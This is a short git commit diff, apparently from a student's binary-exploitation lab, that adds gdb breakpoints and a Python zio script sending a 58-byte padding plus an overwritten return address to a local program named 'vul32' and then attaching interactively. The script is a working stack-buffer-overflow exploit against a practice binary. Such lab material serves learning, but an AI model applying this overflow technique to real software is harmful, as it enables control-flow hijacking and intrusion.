33809826d6b3705c25ec94c652a0904202f5edc5
leefige <liyifei15@mails.tsinghua.edu.cn>
2019-01-09 17:28:50 +0000

    add break

--- vul32/.gdbinit
+++ vul32/.gdbinit
@@ -1,4 +1,4 @@
-break dovuln
+break *0x80485da
 break *0x8048641
 break *0x804865b
 break *0x80486cb
--- vul32/gen.py
+++ vul32/gen.py
@@ -1,2 +1,12 @@
+#! /usr/bin/python
+from zio import *
+
 addr = "\x3a\x86\x04\x08"
-print("a" * 58 + addr+"1234")
+
+io = zio('./vul32')
+code = "a" * 58 + addr+"1234"
+
+
+io.write(code)
+io.interact()
+
